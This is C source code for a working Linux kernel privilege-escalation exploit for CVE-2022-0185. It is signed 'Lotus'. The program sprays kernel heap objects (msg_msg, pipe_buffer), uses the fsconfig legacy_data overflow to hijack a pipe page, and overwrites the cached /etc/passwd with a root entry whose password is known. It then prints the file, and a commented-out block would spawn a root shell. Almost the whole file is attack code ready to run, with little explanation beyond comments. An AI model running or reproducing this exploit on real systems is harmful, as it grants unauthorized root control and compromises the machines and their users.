#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/mount.h>
#include <sys/prctl.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <semaphore.h>
#include <poll.h>
#include <sched.h>


#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif



#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");


int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf*)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

void errExit(char * msg)
{
    printf("\033[31m\033[1m[x] Error : \033[0m%s\n",msg);
    exit(-1);
}


static inline int fsopen(const char *fs_name, unsigned int flags)
{
    return syscall(__NR_fsopen, fs_name, flags);
}

static inline int fsconfig(int fsfd, unsigned int cmd, 
             const char *key, const void *val, int aux)
{
    return syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);
}

/**
 * @brief make an out-of-bound write to the next object in kmalloc-4k,
 * note that the buf before will always be appended to a ",=",
 * for a ctx-legacy_data with 4095 bytes' data, the ',' will be the last byte,
 * and the '=' will always be on the first byte of the object nearby
 * 
 * @return int - the fd for filesystem context
 */
int prepare_oob_write(void)
{
    int fs_fd;

    /* get a filesystem context */
    fs_fd = fsopen("ext4", 0);
    if (fs_fd < 0) {
        errExit("FAILED to fsopen()!");
    }

    /**
     * fulfill the ctx->legacy_data to 4095 bytes, 
     * so that the (0x1000 - 2 - size) overflow
     */
    for (int i = 0; i < 255; i++) {
        fsconfig(fs_fd, FSCONFIG_SET_STRING, "Lotus77", "Lotus77", 0);
    }
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "Lotus777", "Lotus", 0);

    return fs_fd;    
}

#define MSG_NUM 0x100
#define FILE_NUM 0x300
#define MSG_SZ    (0x1000+0x20-sizeof(struct msg_msg)-sizeof(struct msg_msgseg))
#define OOB_READ_SZ    (0x2000-sizeof(struct msg_msg)-sizeof(struct msg_msgseg))
#define MSG_TYPE 0x41414141

#define PIPE_NUM MSG_NUM

int msqid[MSG_NUM];
int file_fd[FILE_NUM];
int pipe_fd[PIPE_NUM][2];
int fs_fd, victim_qidx = -1;


/**
 * @brief We don't need to leak anything here, we just need to occupy a 4k obj.
 */



/* for pipe escalation */
#define SND_PIPE_BUF_SZ 96*2
#define TRD_PIPE_BUF_SZ 192

int orig_pid, victim_pid = -1;
int snd_orig_pid = -1, snd_vicitm_pid = -1;
int self_2nd_pipe_pid = -1, self_3rd_pipe_pid = -1, self_4th_pipe_pid = -1;

struct list_head {
    uint64_t    next;
    uint64_t    prev;
};

struct msg_msg {
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

struct msg_msgseg {
    uint64_t    next;
};


size_t find_page_addr(size_t *data)
{
    for(int idx=0;idx<PIPE_NUM;idx++)
    {
        if(data[idx]>0xffff000000000000&&data[idx+1]==0x100000003&&data[idx+2]>0xffffffff81000000&&data[idx+3]==0&&data[idx]!=0xffffffffffffffff)
        {
            return idx;
        }
    }
    return -1;
}


static void adjust_rlimit() {
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = (200 << 20);
  setrlimit(RLIMIT_AS, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 32 << 20;
  setrlimit(RLIMIT_MEMLOCK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  // setrlimit(RLIMIT_FSIZE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 1 << 20;
  setrlimit(RLIMIT_STACK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &rlim);
  // RLIMIT_FILE

 // RLIMIT_NOFILE 最大打开文件描述符限制，默认为 1024, 设置为4096
    rlim.rlim_cur = rlim.rlim_max = 4096;
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
      perror("[-] setrlimit");
    }
  
}

int main(int argc, char **argv, char **envp)
{
    puts("[*] CVE-2022-0185 by Loτυs");

    puts("[*] touch some file for su pwd");
    system("echo \"Lotus\">/tmp/pwd");

    if (!fork()) {
        /* create new namespace to get CAP_SYS_ADMIN */
        if (unshare(CLONE_NEWNS | CLONE_NEWUSER) < 0) {
            errExit("FAILED to unshare()!");
        }

        cpu_set_t cpu_set;

        CPU_ZERO(&cpu_set);
        CPU_SET(0, &cpu_set);
        sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);


    size_t buf[0x1000], ktext_leak = -1;

    int target_file_fd = open("/etc/passwd",0);
    if(target_file_fd<0)
    {
        errExit("Open passwd failed!");
    }
    adjust_rlimit();
    puts("[*]Pipe Spraying...");
    for (int i = 0; i < PIPE_NUM; i++) {
        if (pipe(pipe_fd[i]) < 0) {
            printf("[x] Failed at creating %d pipe.\n", i);
            errExit("FAILED to create pipe!");
        }
    }

    puts("[*]4k msg_msg Spraying for once...");
    for (int i = 0; i < (MSG_NUM - 8); i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0) {
            errExit("FAILED to create msg_queue!");
        }

        buf[0] = i;
        buf[MSG_SZ / 8] = i;
        if (write_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) < 0) {
            printf("[x] Failed at writing %d queue.\n", i);
            errExit("FAILED to allocate msg_msg!");
        }
    }

    puts("[*] Allocating fs->legacy_data...");
    fs_fd = prepare_oob_write();

    puts("[*]4k msg_msg Spraying for twice...");
    for (int i = (MSG_NUM - 8); i < MSG_NUM; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0) {
            errExit("FAILED to create msg_queue!");
        }

        buf[0] = i;
        buf[MSG_SZ / 8] = i;
        if (write_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) < 0) {
            printf("[x] Failed at writing %d queue.\n", i);
            errExit("FAILED to allocate msg_msg!");
        }
    }


    puts("[*] fsconfig() to set the size to the &msg_msg->m_ts...");
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "3", "114514Lotus777114514", 0);

    puts("[*] fsconfig() to overwrite the msg_msg->m_ts...");
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "\x00", "\xc8\x1f", 0);

    puts("[*]Read from msg_msg to location the one...");
    for (int i = 0; i < MSG_NUM; i++) {
        ssize_t read_size;

        read_size = peek_msg(msqid[i], buf, OOB_READ_SZ, 0);
        if (read_size < 0) {
            printf("[x] Failed at reading %d msg_queue.\n", i);
            errExit("FAILED to read msg_msg!");
        } else if (read_size > MSG_SZ) {
            printf("\033[32m\033[1m[+] Found victim msg_msg at \033[0m"
                   "%d\033[32m\033[1m msg_queue!\033[0m\n", i);
            victim_qidx = i;
            break;
        }
    }

    if (victim_qidx == -1) {
        errExit("Msg_msg not hit!");
    }


    size_t buf2[0x8000];



    puts("[*] Allocating 4k pipe_buffer...");
    for (int i = (PIPE_NUM - 1); i >= 0; i--) 
    {
        if (i == victim_qidx) {
            continue;
        }

        if (read_msg(msqid[i], buf2, MSG_SZ, MSG_TYPE) < 0) {
            printf("[x] Failed at reading %d msg_queue.\n", i);
            errExit("FAILED to release msg_msg!");
        }

        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0) {
            printf("[x] Failed at extending %d pipe_buffer.\n", i);
            errExit("FAILED to extend pipe_buffer!");
        }

        write(pipe_fd[i][1], "Lotus777", 8);
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], "Lotus777", 8);
        write(pipe_fd[i][1], "Lotus777", 8);  
    }

    puts("[*] Overwriting pipe_buffer->page...");
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "77", "77", 0);
    for (int i = 0; i < ((0x1000 - 8 * 4) / 16); i++) {
        fsconfig(fs_fd, FSCONFIG_SET_STRING, "Lotus77", "Lotus77", 0);
    }

    for (int i = (PIPE_NUM - 1); i >= 0; i--) {
        char tmp[0x10];
        int nr;

        if (i == victim_qidx) {
            continue;
        }

        memset(tmp, '\0', sizeof(tmp));
        read(pipe_fd[i][0], tmp, 8);
        read(pipe_fd[i][0], &nr, sizeof(int));
        if (!strcmp(tmp, "Lotus777") && nr != i) {
            orig_pid = i;
            victim_pid = nr;
            break;
        }
    }

    if (victim_pid == -1) {
        errExit("FAILED to hit two pipe_buffer!");
    }

    BLUE printf("[+]Hit!:previous_page: %d, victim pipe:%d\n",orig_pid, victim_pid); CLOSE
    

    size_t pipe_buf[0x100];
    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ/0x28);



    memset(buf, '\0', sizeof(buf));
    

    /* let the page's ptr at pipe_buffer */
    write(pipe_fd[victim_pid][1], buf, SND_PIPE_BUF_SZ*2 - 24 - 3*sizeof(int)+0x18+0x28+0x84);

    puts("[*]Uaf one of the pipe->page...");
    sleep(5);
    close(pipe_fd[orig_pid][0]);
    close(pipe_fd[orig_pid][1]);


    puts("[*] Spray target file struct to the uaf page...");
    for (int i = 0; i < FILE_NUM; i++) 
    {

        file_fd[i] = open("/etc/passwd",0);
        if (file_fd[i] < 0) 
        {
            errExit("FAILED to open pwd file!");
        }
    }
    puts("file spray down!");
    sleep(5);
    int a[2];
    a[0] = 0x480e801f;
    write(pipe_fd[victim_pid][1], a, 4);
    //b *0xffffffff81314e20 t pipe_read
    //b *0xffffffff81315290 t pipe_write
    //b *0xffffffff8157fd3d call copyout
    //b *0xffffffff8157fba2 call copyin
    
    // 0x484a801d

    char *data = "root:$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt Lotus Lotus
    printf("Setting root password to \"Lotus\"...\n");
    int data_size = strlen(data);

    puts("[*]finally: edit the pwd page cache");
    //what we want to edit pipe->page
    for (int i = 0;i < FILE_NUM; i++) {
        int retval = write(file_fd[i], data,data_size);
            if (retval > 0)
            {
               RED printf("Write Success:%d!",i); CLOSE
            }

        }
    
    puts("[*]Now the pwd is:");
    system("cat /etc/passwd");
    RED puts("[*]You should use su yourself and enter the passwd `Lotus`"); CLOSE
    // char *cmd[] = {"/bin/sh", "-c", "cat /tmp/pwd | su - -c \""
    //             "echo \\\"Done! Popping shell... (run commands now)\\\";"
    //             "/bin/sh;"
    //         "\" root"};

    // execv("/bin/sh", cmd);

    } 
    return 0;
}
